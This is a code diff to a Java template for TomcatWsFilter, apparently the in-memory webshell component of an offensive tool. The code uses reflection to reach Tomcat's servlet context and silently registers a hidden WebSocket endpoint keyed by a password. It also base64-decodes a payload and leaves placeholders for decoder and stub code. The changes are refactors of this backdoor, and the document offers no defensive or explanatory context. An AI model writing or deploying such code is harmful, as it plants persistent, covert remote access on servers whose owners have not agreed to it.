@@ -4,7 +4,7 @@ import javax.websocket.*;
 import javax.websocket.server.ServerContainer;
 import javax.websocket.server.ServerEndpointConfig;
 import java.lang.reflect.*;
-import java.util.ArrayList;
+import java.util.*;
 
 public class TomcatWsFilter extends Endpoint
         implements MessageHandler.Whole<String>
@@ -57,6 +57,18 @@ public class TomcatWsFilter extends Endpoint
         }}
     }}
 
+    private Method getMethodX(Class clazz, String methodName, int num) {{
+        Method[] methods = clazz.getDeclaredMethods();
+        for (Method method : methods) {{
+            if (method.getName().equals(methodName)) {{
+                if (method.getParameterTypes().length == num) {{
+                    return method;
+                }}
+            }}
+        }}
+        return null;
+    }}
+
     private Method getMethod(Class clazz, String methodName, Class... args) {{
         Method method = null;
         while (clazz != null) {{
@@ -82,7 +94,6 @@ public class TomcatWsFilter extends Endpoint
                 }} else {{
                     clazzs.add(null);
                 }}
-
             }}
         }}
         Method method = getMethod(
@@ -94,13 +105,6 @@ public class TomcatWsFilter extends Endpoint
         }} catch (Exception e) {{
             return null;
         }}
-    }}
-
-    private Object getStandardContext() {{
-        return invokeMethod(
-            getFieldValue(getLoader(), "resources"),
-            "getContext"
-        );
     }}
 
     private byte[] b64decode(String payload) {{
@@ -124,6 +128,7 @@ public class TomcatWsFilter extends Endpoint
         }} catch (Exception ex) {{}}
         return bytes;
     }}
+{context}
 {decoder}
 {stub}
     @Override
@@ -143,7 +148,7 @@ public class TomcatWsFilter extends Endpoint
         }}
     }}
 
-    private void addWsFilter() throws DeploymentException {{
+    private void addWsFilter() throws Exception {{
         ServletContext servletContext = (ServletContext) invokeMethod(
             getStandardContext(), "getServletContext"
         );
@@ -151,7 +156,7 @@ public class TomcatWsFilter extends Endpoint
             .create(TomcatWsFilter.class, password).build();
         ServerContainer container = (ServerContainer) servletContext
             .getAttribute(ServerContainer.class.getName());
-        if (servletContext.getAttribute(password) == null){{
+        if (servletContext.getAttribute(password) == null) {{
             container.addEndpoint(configEndpoint);
             servletContext.setAttribute(password, password);
         }}
@@ -161,7 +166,7 @@ public class TomcatWsFilter extends Endpoint
         synchronized(lock) {{
             try {{
                 addWsFilter();
-            }} catch (DeploymentException e) {{}}
+            }} catch (Exception e) {{}}
         }}
     }}
 
